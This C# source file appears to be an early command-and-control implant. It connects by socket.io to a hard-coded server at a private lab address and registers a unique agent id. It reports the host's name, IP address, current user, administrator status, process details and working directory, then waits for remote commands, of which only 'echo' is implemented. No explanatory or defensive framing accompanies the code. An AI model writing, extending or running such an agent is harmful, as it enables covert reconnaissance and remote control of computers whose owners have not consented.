using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using SocketIOClient;
using System.Net;
using System.Security.Principal;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length > 1)
            {
                Go(args[0]);
            }
            else
            {
                Go();
            }
            while (true) { };
        }
        static async void Go(string home = "http://172.16.113.1:3000/client")
        {
            // create new socket.io client
            var client = new SocketIO(home);

            // Create the agent id
            string id = Guid.NewGuid().ToString();

            // register all of the commands
            client.On("echo", response =>
            {
                Console.WriteLine(response.ToString());
                client.EmitAsync("echo", response.ToString());
            });

            // add an event that happens when we first connect
            client.OnConnected += (sender, e) =>
            {
                client.EmitAsync("register", GetSysinfo(id));
            };

            // finally, connect to the server and start the party
            await client.ConnectAsync();
        }
        public static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());

            var ip = host.AddressList.FirstOrDefault(_ip => _ip.AddressFamily == AddressFamily.InterNetwork);

            return ip != null ? ip.ToString() : "0.0.0.0";
        }
        private static bool AmIHigh()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        static object GetSysinfo(string id)
        {
            string hostname = Environment.MachineName;
            string ipaddr = GetLocalIPAddress();
            string elevated = AmIHigh() ? "*" : "";
            string username = elevated + WindowsIdentity.GetCurrent().Name;
            string pid = Process.GetCurrentProcess().Id.ToString();
            string process = Process.GetCurrentProcess().ProcessName;
            string pwd = Directory.GetCurrentDirectory();

            return new { id, hostname, ipaddr, username, pid, process, pwd };
        }
    }
}
